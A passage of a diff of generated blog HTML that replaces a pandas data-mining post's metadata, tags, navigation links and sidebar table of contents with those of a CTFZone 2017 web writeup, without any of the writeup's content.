-  <p><span>最后更新:</span>2017年06月20日 - 11:06</p>
-  <p><span>原始链接:</span><a href="/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/" title="数据挖掘比赛（1）对无列名的txt数据集读取方法及处理">http://yoursite.com/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2017年07月19日 - 16:07</p>
+  <p><span>最后更新:</span>2017年07月19日 - 16:07</p>
+  <p><span>原始链接:</span><a href="/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" title="CTFZone-2017-Leaked messages-writeup">http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -537,9 +509,13 @@
       
         <div class="post-tags">
           
-            <a href="/tags/数据挖掘/" rel="tag"># 数据挖掘</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
-            <a href="/tags/天池比赛/" rel="tag"># 天池比赛</a>
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/CTFZone/" rel="tag"># CTFZone</a>
           
         </div>
       
@@ -548,8 +524,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/01/22/数据挖掘比赛（0）环境搭建之anaconda安装/" rel="next" title="数据挖掘比赛（0）环境搭建之anaconda安装">
-                <i class="fa fa-chevron-left"></i> 数据挖掘比赛（0）环境搭建之anaconda安装
+              <a href="/2017/07/17/XMAN选拔赛-2017-misc-writeup/" rel="next" title="XMAN选拔赛-2017-misc-writeup">
+                <i class="fa fa-chevron-left"></i> XMAN选拔赛-2017-misc-writeup
               </a>
             
           </div>
@@ -558,8 +534,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/01/25/数据挖掘比赛（2）利用pandas读取大型数据集/" rel="prev" title="数据挖掘比赛（2）利用pandas读取大型数据集">
-                数据挖掘比赛（2）利用pandas读取大型数据集 <i class="fa fa-chevron-right"></i>
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -609,17 +585,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview sidebar-panel">
+      <section class="site-overview sidebar-panel sidebar-panel-active">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -715,22 +682,6 @@
 
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基本的读入"><span class="nav-number">1.</span> <span class="nav-text">基本的读入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#读入csv文件"><span class="nav-number">1.1.</span> <span class="nav-text">读入csv文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读入txt文件"><span class="nav-number">1.2.</span> <span class="nav-text">读入txt文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#针对无列名文件第一行的读入处理"><span class="nav-number">2.</span> <span class="nav-text">针对无列名文件第一行的读入处理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#对txt数据集读入处理为正常的dataframe形式"><span class="nav-number">3.</span> <span class="nav-text">对txt数据集读入处理为正常的dataframe形式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#给无列名的数据集添加列名"><span class="nav-number">4.</span> <span class="nav-text">给无列名的数据集添加列名</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#法一：直接操作"><span class="nav-number">4.1.</span> <span class="nav-text">法一：直接操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#法二：在利用pandas读入时指定列名"><span class="nav-number">4.2.</span> <span class="nav-text">法二：在利用pandas读入时指定列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#法三：在用pandas读入后再制定列名"><span class="nav-number">4.3.</span> <span class="nav-text">法三：在用pandas读入后再制定列名</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
     </div>
